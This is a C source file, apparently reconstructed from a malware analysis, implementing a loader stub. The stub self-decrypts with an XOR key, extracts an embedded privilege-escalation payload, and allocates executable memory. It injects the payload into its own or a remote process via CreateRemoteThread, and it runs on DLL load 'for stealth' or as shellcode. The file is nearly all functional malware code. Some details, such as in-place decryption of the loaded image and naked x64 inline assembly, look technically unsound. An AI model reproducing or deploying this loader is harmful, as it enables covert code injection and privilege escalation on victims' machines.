/**
 * PE #4 - Stub Launcher Implementation
 * 
 * RECONSTRUCTED FROM SECURITY ANALYSIS
 * Classification: TLP:RED - Security Research Only
 * 
 * This is a minimal 3KB launcher stub that serves as the initial
 * execution point. It:
 * 1. Decrypts itself using XOR key 0x55
 * 2. Extracts the embedded PE #5 exploit
 * 3. Injects PE #5 into memory
 * 4. Executes PE #5 for privilege escalation
 * 
 * Key design goals:
 * - Minimal size (3,045 bytes)
 * - Fast execution (<1 microsecond decryption)
 * - No external dependencies
 * - Position-independent code
 */

#include "stub.h"

//=============================================================================
// GLOBALS
//=============================================================================

static BOOL g_Decrypted = FALSE;
static PBYTE g_PE5Data = NULL;
static DWORD g_PE5Size = 0;

//=============================================================================
// SELF-DECRYPTION
//=============================================================================

/**
 * Decrypt PE #4 stub code in-place.
 * 
 * Uses simple single-byte XOR with key 0x55.
 * Designed for speed - decryption takes ~1 microsecond.
 * 
 * @param Buffer    Buffer to decrypt
 * @param Size      Size in bytes
 * @return          TRUE on success
 */
BOOL 
PE4_Decrypt(
    PBYTE   Buffer,
    DWORD   Size
)
{
    DWORD i;
    BYTE key = PE4_XOR_KEY;  // 0x55
    
    // Simple XOR loop - optimized for minimal size
    for (i = 0; i < Size; i++) {
        Buffer[i] ^= key;
    }
    
    g_Decrypted = TRUE;
    return TRUE;
}

/**
 * Fast 8-byte XOR decryption for larger buffers.
 */
static void 
XorDecrypt64(
    PBYTE   Buffer,
    DWORD   Size
)
{
    ULONGLONG key64;
    ULONGLONG* ptr;
    DWORD chunks, i;
    BYTE key = PE4_XOR_KEY;
    
    // Expand 0x55 to 0x5555555555555555
    key64 = 0x5555555555555555ULL;
    
    // Process 8 bytes at a time
    ptr = (ULONGLONG*)Buffer;
    chunks = Size / 8;
    
    for (i = 0; i < chunks; i++) {
        ptr[i] ^= key64;
    }
    
    // Handle remaining bytes
    for (i = chunks * 8; i < Size; i++) {
        Buffer[i] ^= key;
    }
}

//=============================================================================
// PE #5 EXTRACTION
//=============================================================================

/**
 * Extract embedded PE #5 data from the stub.
 * 
 * PE #5 is embedded at offset 0x200 within PE #4.
 * It remains encrypted until explicitly decrypted.
 * 
 * @param StubBase  Base address of PE #4 stub
 * @param PE5Size   Receives size of PE #5
 * @return          Pointer to PE #5 data
 */
PBYTE 
PE4_ExtractPE5(
    PBYTE   StubBase,
    PDWORD  PE5Size
)
{
    PBYTE pe5Data;
    
    if (StubBase == NULL) {
        return NULL;
    }
    
    // PE #5 is embedded at fixed offset
    pe5Data = StubBase + PE5_EMBEDDED_OFFSET;
    
    if (PE5Size != NULL) {
        *PE5Size = PE5_EMBEDDED_SIZE;
    }
    
    // Cache for later use
    g_PE5Data = pe5Data;
    g_PE5Size = PE5_EMBEDDED_SIZE;
    
    return pe5Data;
}

//=============================================================================
// MEMORY ALLOCATION
//=============================================================================

/**
 * Allocate RWX memory for PE #5.
 * 
 * Allocates memory with read/write/execute permissions for
 * in-memory execution of PE #5.
 * 
 * @param hProcess  Target process handle
 * @param Size      Size to allocate
 * @return          Address of allocated memory
 */
static PVOID 
AllocateExecutableMemory(
    HANDLE  hProcess,
    DWORD   Size
)
{
    PVOID memory = NULL;
    
    if (hProcess == GetCurrentProcess() || hProcess == NULL) {
        // Allocate in current process
        memory = VirtualAlloc(
            NULL,
            Size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
    } else {
        // Allocate in remote process
        memory = VirtualAllocEx(
            hProcess,
            NULL,
            Size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
    }
    
    return memory;
}

//=============================================================================
// PE #5 INJECTION
//=============================================================================

/**
 * Inject PE #5 into target process memory.
 * 
 * @param hProcess  Target process handle (NULL for current)
 * @param PE5Data   PE #5 binary data
 * @param PE5Size   Size of PE #5
 * @param Method    Injection method to use
 * @return          TRUE on success
 */
BOOL 
PE4_InjectPE5(
    HANDLE  hProcess,
    PBYTE   PE5Data,
    DWORD   PE5Size,
    INJECTION_METHOD Method
)
{
    PVOID remoteBase;
    SIZE_T bytesWritten;
    
    // Default to current process
    if (hProcess == NULL) {
        hProcess = GetCurrentProcess();
    }
    
    // Allocate memory for PE #5
    remoteBase = AllocateExecutableMemory(hProcess, PE5Size);
    if (remoteBase == NULL) {
        return FALSE;
    }
    
    // Copy PE #5 to allocated memory
    if (hProcess == GetCurrentProcess()) {
        // Direct memory copy for current process
        CopyMemory(remoteBase, PE5Data, PE5Size);
    } else {
        // Write to remote process
        if (!WriteProcessMemory(
                hProcess,
                remoteBase,
                PE5Data,
                PE5Size,
                &bytesWritten)) {
            VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
            return FALSE;
        }
    }
    
    // Execute PE #5
    return PE4_ExecutePE5(hProcess, remoteBase);
}

//=============================================================================
// PE #5 EXECUTION
//=============================================================================

/**
 * Execute PE #5 in target process.
 * 
 * Creates a new thread at PE #5's entry point.
 * The entry point is at offset 0 of the injected memory.
 * 
 * @param hProcess      Target process handle
 * @param RemoteBase    Base address of injected PE #5
 * @return              TRUE on success
 */
BOOL 
PE4_ExecutePE5(
    HANDLE  hProcess,
    PVOID   RemoteBase
)
{
    HANDLE hThread = NULL;
    DWORD threadId;
    DWORD exitCode;
    
    if (RemoteBase == NULL) {
        return FALSE;
    }
    
    if (hProcess == GetCurrentProcess()) {
        // Create thread in current process
        // Entry point is at offset 0 of PE #5
        hThread = CreateThread(
            NULL,
            0,
            (LPTHREAD_START_ROUTINE)RemoteBase,
            NULL,
            0,
            &threadId
        );
    } else {
        // Create remote thread
        hThread = CreateRemoteThread(
            hProcess,
            NULL,
            0,
            (LPTHREAD_START_ROUTINE)RemoteBase,
            NULL,
            0,
            &threadId
        );
    }
    
    if (hThread == NULL) {
        return FALSE;
    }
    
    // Wait for PE #5 to complete (with timeout)
    // PE #5 execution takes ~10 microseconds
    WaitForSingleObject(hThread, 5000);  // 5 second timeout
    
    // Check exit code
    GetExitCodeThread(hThread, &exitCode);
    CloseHandle(hThread);
    
    // Exit code 0 = success (EXPLOIT_SUCCESS)
    return (exitCode == 0);
}

//=============================================================================
// MAIN STUB ENTRY POINT
//=============================================================================

/**
 * Main PE #4 stub entry point.
 * 
 * This function is called when PE #4 is executed.
 * It orchestrates the entire PE #5 deployment.
 * 
 * Execution timeline:
 * - 0μs: Entry
 * - 1μs: Self-decryption complete
 * - 2μs: PE #5 extracted
 * - 3μs: Memory allocated
 * - 4μs: PE #5 injected
 * - 5μs: PE #5 thread created
 * - 15μs: PE #5 completes (privilege escalation done)
 * 
 * @param lpParameter   Optional parameter (unused)
 * @return              0 on success, error code on failure
 */
DWORD WINAPI 
PE4_StubMain(
    LPVOID lpParameter
)
{
    PBYTE stubBase;
    PBYTE pe5Data;
    DWORD pe5Size;
    BOOL success;
    
    UNREFERENCED_PARAMETER(lpParameter);
    
    //=========================================================================
    // STEP 1: Get our own base address
    //=========================================================================
    
    stubBase = (PBYTE)GetModuleHandleW(NULL);
    if (stubBase == NULL) {
        return 1;  // Failed to get module base
    }
    
    //=========================================================================
    // STEP 2: Self-decrypt (if not already done)
    //=========================================================================
    
    if (!g_Decrypted) {
        // Decrypt the stub
        // Note: In real malware, this would use position-independent
        // code to find and decrypt itself
        PE4_Decrypt(stubBase, PE4_SIZE);
    }
    
    //=========================================================================
    // STEP 3: Extract embedded PE #5
    //=========================================================================
    
    pe5Data = PE4_ExtractPE5(stubBase, &pe5Size);
    if (pe5Data == NULL) {
        return 2;  // Failed to extract PE #5
    }
    
    //=========================================================================
    // STEP 4: Inject PE #5 into current process
    //=========================================================================
    
    success = PE4_InjectPE5(
        NULL,                   // Current process
        pe5Data,
        pe5Size,
        INJECT_SELF            // Inject into self
    );
    
    if (!success) {
        return 3;  // Failed to inject PE #5
    }
    
    //=========================================================================
    // SUCCESS: PE #5 has executed and elevated privileges
    //=========================================================================
    
    return 0;
}

//=============================================================================
// DLL ENTRY POINT
//=============================================================================

/**
 * DLL entry point for PE #4.
 * 
 * When loaded as a DLL, immediately execute the stub.
 */
BOOL WINAPI 
DllMain(
    HINSTANCE   hinstDLL,
    DWORD       fdwReason,
    LPVOID      lpvReserved
)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);
    
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Disable thread notifications for stealth
            DisableThreadLibraryCalls(hinstDLL);
            
            // Execute stub immediately
            PE4_StubMain(NULL);
            break;
            
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    
    return TRUE;
}

//=============================================================================
// SHELLCODE ENTRY POINT
//=============================================================================

/**
 * Position-independent shellcode entry point.
 * 
 * This is used when PE #4 is injected as raw shellcode rather
 * than loaded as a PE.
 */
void __declspec(naked) 
PE4_ShellcodeEntry(void)
{
    __asm {
        ; Save registers
        push    rbp
        mov     rbp, rsp
        sub     rsp, 0x40
        
        ; Get our own base using RIP-relative addressing
        lea     rax, [rip]
        sub     rax, 0x10           ; Adjust to start of shellcode
        
        ; Call main stub
        xor     rcx, rcx            ; lpParameter = NULL
        call    PE4_StubMain
        
        ; Restore and return
        add     rsp, 0x40
        pop     rbp
        ret
    }
}
